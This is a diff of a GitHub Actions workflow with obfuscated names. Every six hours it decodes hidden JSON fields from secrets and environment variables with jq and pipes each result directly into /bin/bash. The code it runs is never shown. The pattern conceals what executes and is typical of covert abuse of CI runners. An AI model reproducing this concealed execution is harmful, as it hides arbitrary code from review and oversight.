@@ -3,23 +3,25 @@ name: luorenzong1098
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 4/6 * * *'
+    - cron: '4 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luorenzong1098
         env:
-          y37857: ${{ secrets.y37857 }}
+          kzc197: ${{ secrets.kzc197 }}
         run: |
-          echo $y37857 | jq -r .fve08039 | /bin/bash
-          echo $yn538 | jq -r .sr8 | /bin/bash
-          echo $llz028 | jq -r .jonki5 | /bin/bash
-          echo $lkmgh1 | jq -r .lpqk7 | /bin/bash
-          echo $pfjwn5 | jq -r .psrwn60 | /bin/bash
-          echo $o94741 | jq -r .g9873 | /bin/bash
-          echo $zfumr279 | jq -r .qcp651 | /bin/bash
+          echo $kzc197 | jq -r .tibs32 | /bin/bash
+          echo $kcjzu40 | jq -r .icgh0 | /bin/bash
+          echo $h779 | jq -r .yrku24703 | /bin/bash
+          echo $xe958 | jq -r .pqk605 | /bin/bash
+          echo $six05 | jq -r .goxbd87369 | /bin/bash
+          echo $j13 | jq -r .xaqjz93 | /bin/bash
+          echo $o408 | jq -r .dd54 | /bin/bash
+          echo $k23797 | jq -r .ufmgy68384 | /bin/bash
+          echo $o3153 | jq -r .kh268 | /bin/bash
+          echo $rqdt20 | jq -r .odhx884 | /bin/bash
 
